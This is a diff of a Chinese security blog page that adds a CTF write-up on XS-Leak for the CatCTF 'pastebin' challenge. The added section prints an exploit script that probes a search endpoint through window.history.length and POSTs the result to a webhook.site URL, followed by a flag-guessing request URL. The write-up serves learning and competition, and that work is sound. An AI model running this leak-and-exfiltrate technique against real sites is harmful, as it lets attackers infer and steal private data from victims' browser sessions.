@@ -464,14 +464,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    379
+                    675
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    2 分
                 </div>
                 
 
@@ -515,9 +515,29 @@
 <li>好吧，这听着好像是没有用，可是随着技术不断更新，XS Leak 的攻击方式不断改进。</li>
 </ul>
 </blockquote>
-<p>今天我们主要介绍介绍 XS Leak 利用浏览器的缓存机制的攻击手段。</p>
-<h2 id="0x03-XS-Leak-的利用"><a href="#0x03-XS-Leak-的利用" class="headerlink" title="0x03 XS Leak 的利用"></a>0x03 XS Leak 的利用</h2><p>以 HTB 的靶场为例，学习一下。</p>
-<p>太难了，懂原理之后再回来看</p>
+<h2 id="0x03-XS-Leak-的利用"><a href="#0x03-XS-Leak-的利用" class="headerlink" title="0x03 XS Leak 的利用"></a>0x03 XS Leak 的利用</h2><ul>
+<li>本来这篇文章几乎对于我来说已经很难写下去了，可是最近 CatCTF 当中，在测题的过程中偶然发现了 XSLeak 的真正用处，它并非是一个“鸡肋”</li>
+</ul>
+<p>在开始说利用之前，需要明确的是 XSLeak 并非是一种漏洞，而是一种作辅助的攻击手法。</p>
+<p>在这道 CatCTF 的题目 pastebin 当中，听 LemonPerfect 师傅说有部分是参考原题的，是一个 XSS 打 XSLeak 的题目，挺有意思。</p>
+<p>先放 exp</p>
+<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+    <span class="token keyword">let</span> text <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'text'</span><span class="token punctuation">)</span>
+    <span class="token keyword">let</span> w <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'http://localhost:5000/find?text='</span> <span class="token operator">+</span> text<span class="token punctuation">)</span>
+    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+        w<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">'about:blank'</span>
+        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>w<span class="token punctuation">.</span>history<span class="token punctuation">.</span>length<span class="token punctuation">)</span>
+            <span class="token keyword">const</span> webhook <span class="token operator">=</span> <span class="token string">'https://webhook.site/c171b240-3c3f-4121-91f3-a4f3a6987e35'</span>
+            <span class="token function">fetch</span><span class="token punctuation">(</span>webhook<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">method</span><span class="token operator">:</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token literal-property property">body</span><span class="token operator">:</span>w<span class="token punctuation">.</span>history<span class="token punctuation">.</span>length<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>webhook 是一个网站，地址是 <a target="_blank" rel="noopener" href="https://webhook.site">https://webhook.site</a><br>可以用来拦截请求。</p>
+<p>而那道题目当中，admin will visit your site soon，这也就构成了一个 xss，所以我们请求可以这么写</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//vps:port/exp.html?text=catctf&#123;xxx</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>如果正确，回显2，错误回显3，完全正确回显1</p>
+<h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h2><p>小结一下，该怎么说呢？XSLeak 更像是一种思想&amp;攻击的辅助手段，而并非是一种漏洞，所以作为 HTB 的那一道题目，只是介绍了这种攻击辅助方式，非常有趣，能够相当拓宽攻击者的攻击思路。</p>
 
                 
             </div>
@@ -1288,7 +1308,7 @@
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             
-                <span id="year">2021-2022</span>
+                <span id="year">2021-2023</span>
             
             <span id="year">2021</span>
             <a href="/about" target="_blank">Drun1baby</a>
